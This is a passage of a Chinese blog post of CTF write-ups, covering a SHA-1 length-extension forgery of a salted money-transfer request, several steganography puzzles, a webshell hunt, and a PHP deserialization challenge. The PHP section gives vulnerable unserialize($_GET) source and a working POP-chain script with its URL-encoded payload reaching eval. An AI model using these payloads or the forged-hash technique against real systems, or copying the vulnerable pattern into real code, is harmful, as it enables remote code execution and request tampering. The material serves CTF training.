+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0x67452301, 0xefcdab89, 0x98badcfe, 0x10325476, 0xc3d2e1f0</span><br><span class="line">sha1(“s3cRe7-#!@~from=123&amp;to=456&amp;amount=50”)</span><br><span class="line">= “18d2fccddeba1b08304fb53e849be5711d55b2e0&quot;</span><br></pre></td></tr></table></figure>
+
+<p>后面的每一个字符串都是通过前一个数据块的结果进行加密<br>因此数据块2的加密密钥就是</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(0x18d2fccd, 0xdeba1b08, 0x304fb53e, 0x849be571, 0x1d55b2e0)</span><br></pre></td></tr></table></figure>
+<p>构造复合的数据块</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">66 72 6f 6d 3d 31 32 33 26 74 6f 3d 34 35 36 26    from=123&amp;to=456&amp;</span><br><span class="line">61 6d 6f 75 6e 74 3d 35 30 80 00 00 00 00 00 00    amount=50.......</span><br><span class="line">00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................</span><br><span class="line">00 00 00 01 20 26 74 6f 3d 36 36 36 26 61 6d 6f    .... &amp;to=666&amp;amo</span><br><span class="line">75 6e 74 3d 39 39 39 39 39                         unt=99999  </span><br></pre></td></tr></table></figure>
+<p>因为我们已知存在11长度的salt，将数据块向前移11位<br>得到新的hash值</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">5a77fe8376811dbf7533509cceb6c8c53f98e253</span><br></pre></td></tr></table></figure>
+<p>而这个值正好是我们后续加上的块2的sha1值，因此我们成功绕过了salt拿到传输数据的hash值。<br>得到flag。</p>
+<h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="乌镇峰会种图"><a href="#乌镇峰会种图" class="headerlink" title="乌镇峰会种图"></a>乌镇峰会种图</h2><p>打开<br><img src=".%5Cb56cde4f-be03-4d07-a0ca-6af22284f0aa.jpg" alt="b56cde4f-be03-4d07-a0ca-6af22284f0aa.jpg"><br>没什么特殊的，winhex打开得到flag</p>
+<p><img src=".%5C%E6%8D%95%E8%8E%B7.PNG" alt="捕获.PNG"></p>
+<h2 id="lsb"><a href="#lsb" class="headerlink" title="lsb"></a>lsb</h2><p>使用stegsolve打开，</p>
+<p><img src=".%5C2.PNG" alt="2.PNG"><br>可以看到明显的0通道更改<br>使用lsb更改<br>没有立即发下flag或者文字信息，但看到了png头。</p>
+<p><img src=".%5C3.PNG" alt="3.PNG"></p>
+<p>save bin保存为png<br>得到二维码</p>
+<p><img src=".%5C1.png" alt="1.png"><br>得到flag<br>cumtctf{1sb_i4_s0_Ea4y}</p>
+<h2 id="镜中世界"><a href="#镜中世界" class="headerlink" title="镜中世界"></a>镜中世界</h2><p><img src=".%5Csteg.png" alt="steg.png"></p>
+<p>提示使用steg<br>在red0通道中发现了信息</p>
+<p><img src=".%5C4.PNG" alt="4.PNG"></p>
+<p>考虑lsb<br>得到flag</p>
+<p><img src=".%5C5.PNG" alt="5.PNG"><br>  Hey I th ink we c<br>616e207772697465 20736166656c7920  an write  safely<br>696e207468697320 66696c6520776974  in this  file wit<br>686f757420616e79 6f6e652073656569  hout any one seei<br>6e672069742e2041 6e797761792c2074  ng it. A nyway, t<br>6865207365637265 74206b6579206973  he secre t key is<br>3a2073743367305f 7361757275735f77  : st3g0_ saurus_w<br>7233636b73000000 0000000000000000  r3cks</p>
+<h2 id="webshell后门"><a href="#webshell后门" class="headerlink" title="webshell后门"></a>webshell后门</h2><p>题目要求寻找后门<br>尝试使用gerp命令，但找到的eval后门不是目标。<br>使用D盾扫面，发现目标大马</p>
+<p><img src=".%5Ca.PNG" alt="a.PNG"></p>
+<p><img src=".%5Cc.PNG" alt="c.PNG"></p>
+<p>得到falg</p>
+<h2 id="DEMO2"><a href="#DEMO2" class="headerlink" title="DEMO2"></a>DEMO2</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="string">&#x27;demo2.php&#x27;</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test1</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$varr</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;varr = <span class="string">&quot;demo2.php&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(file_exists(<span class="keyword">$this</span>-&gt;varr))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt;文件&quot;</span>.<span class="keyword">$this</span>-&gt;varr.<span class="string">&quot;存在&lt;br /&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test2</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$varr</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;varr=<span class="string">&#x27;123456&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;obj=<span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;obj-&gt;execute();</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;varr;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt;这是f2的析构函数&lt;br /&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test3</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$varr</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">execute</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;varr);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt;这是f3的析构函数&lt;br /&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;x&#x27;</span>])) &#123;</span><br><span class="line">		unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;x&#x27;</span>]);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>poc<br>test3：eval任意命令执行-&gt;test2:__tostring调用execute方法-&gt;test1:对象转化为字符串调用test2：__tostring</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">test1</span></span>&#123;</span><br><span class="line">		<span class="keyword">public</span> <span class="variable">$varr</span>;</span><br><span class="line">		<span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">		</span>&#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;varr = <span class="keyword">new</span> test2();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">test2</span></span></span><br><span class="line"><span class="class">	</span>&#123;</span><br><span class="line">		<span class="keyword">public</span> <span class="variable">$varr</span>;</span><br><span class="line">		<span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line">		<span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">		</span>&#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;varr=<span class="string">&#x27;123456&#x27;</span>;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;obj=<span class="keyword">new</span> test3();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">test3</span></span></span><br><span class="line"><span class="class">	</span>&#123;</span><br><span class="line">		<span class="keyword">public</span> <span class="variable">$varr</span> = <span class="string">&#x27;phpinfo();&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="variable">$o</span> = <span class="keyword">new</span> test1();</span><br><span class="line">	<span class="variable">$s</span> = serialize(<span class="variable">$o</span>);</span><br><span class="line">	<span class="keyword">echo</span> urlencode(<span class="variable">$s</span>);</span><br><span class="line"><span class="comment">//O%3A5%3A%22test1%22%3A1%3A%7Bs%3A4%3A%22varr%22%3BO%3A5%3A%22test2%22%3A2%3A%7Bs%3A4%3A%22varr%22%3Bs%3A6%3A%22123456%22%3Bs%3A3%3A%22obj%22%3BO%3A5%3A%22test3%22%3A1%3A%7Bs%3A4%3A%22varr%22%3Bs%3A10%3A%22phpinfo%28%29%3B%22%3B%7D%7D%7D</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2022/04/11/4-13/" rel="prev" title="4-13">
+      <i class="fa fa-chevron-left"></i> 4-13
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2022/04/26/4-27/" rel="next" title="4-27">
+      4-27 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    
+  <div class="comments">
+    <div id="lv-container" data-id="city" data-uid="MTAyMC81NDU4OS8zMTA2MA=="></div>
+  </div>
+  
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#DCTF2022"><span class="nav-number">1.</span> <span class="nav-text">DCTF2022</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#sql-tutor"><span class="nav-number">1.1.</span> <span class="nav-text">sql tutor</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SAFE-SPACE"><span class="nav-number">1.2.</span> <span class="nav-text">SAFE SPACE</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#sha-1%E5%88%A9%E7%94%A8demo"><span class="nav-number">2.</span> <span class="nav-text">sha-1利用demo</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#misc"><span class="nav-number">3.</span> <span class="nav-text">misc</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B9%8C%E9%95%87%E5%B3%B0%E4%BC%9A%E7%A7%8D%E5%9B%BE"><span class="nav-number">3.1.</span> <span class="nav-text">乌镇峰会种图</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#lsb"><span class="nav-number">3.2.</span> <span class="nav-text">lsb</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%95%9C%E4%B8%AD%E4%B8%96%E7%95%8C"><span class="nav-number">3.3.</span> <span class="nav-text">镜中世界</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#webshell%E5%90%8E%E9%97%A8"><span class="nav-number">3.4.</span> <span class="nav-text">webshell后门</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#DEMO2"><span class="nav-number">3.5.</span> <span class="nav-text">DEMO2</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">hanbaiGG</p>
+  <div class="site-description" itemprop="description">为什么不拉弟弟一把呢</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">28</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">1</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; Tue Oct 19 2021 08:00:00 GMT+0800 (中国标准时间) – 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">hanbaiGG</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  
+  <script color='0,0,255' opacity='0.8' zIndex='-1' count='300' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+  <script defer src="/lib/three/three.min.js"></script>
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+<script>
+NexT.utils.loadComments(document.querySelector('#lv-container'), () => {
+  window.livereOptions = {
+    refer: location.pathname.replace(CONFIG.root, '').replace('index.html', '')
+  };
+  (function(d, s) {
+    var j, e = d.getElementsByTagName(s)[0];
+    if (typeof LivereTower === 'function') { return; }
+    j = d.createElement(s);
+    j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+    j.async = true;
+    e.parentNode.insertBefore(j, e);
+  })(document, 'script');
+});
+</script>
+
+</body>
+</html>
